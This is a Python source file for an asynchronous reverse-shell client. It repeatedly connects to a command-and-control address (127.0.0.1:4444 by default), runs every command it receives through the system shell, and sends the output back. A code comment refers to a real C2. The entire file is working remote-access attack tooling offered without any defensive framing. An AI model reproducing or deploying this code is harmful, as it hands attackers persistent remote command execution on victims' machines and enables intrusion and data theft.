import asyncio
import os
import platform
import subprocess
import sys
from colorama import Fore, init

init(autoreset=True)

class AsyncReverseShell:
    def __init__(self, host='127.0.0.1', port=4444):
        self.host = host
        self.port = port
        self.system = platform.system().lower()

    async def execute_command(self, command):
        try:
            # Use shell=True for simple command execution, but be careful
            # In a real C2, you'd want better command parsing
            proc = await asyncio.create_subprocess_shell(
                command,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, stderr = await proc.communicate()
            return stdout + stderr
        except Exception as e:
            return str(e).encode()

    async def run(self):
        while True:
            try:
                print(f"{Fore.WHITE}[*] Connecting to C2 at {self.host}:{self.port}...")
                reader, writer = await asyncio.open_connection(self.host, self.port)
                print(f"{Fore.GREEN}[+] Connected!")
                
                while True:
                    data = await reader.read(1024)
                    if not data:
                        break
                    
                    cmd = data.decode().strip()
                    print(f"{Fore.YELLOW}[*] Executing: {cmd}")
                    
                    output = await self.execute_command(cmd)
                    writer.write(output)
                    await writer.drain()
                    
                writer.close()
                await writer.wait_closed()
            except Exception as e:
                print(f"{Fore.RED}[!] Connection error: {e}. Retrying in 5s...")
                await asyncio.sleep(5)

if __name__ == "__main__":
    client = AsyncReverseShell()
    try:
        asyncio.run(client.run())
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Client stopped.")
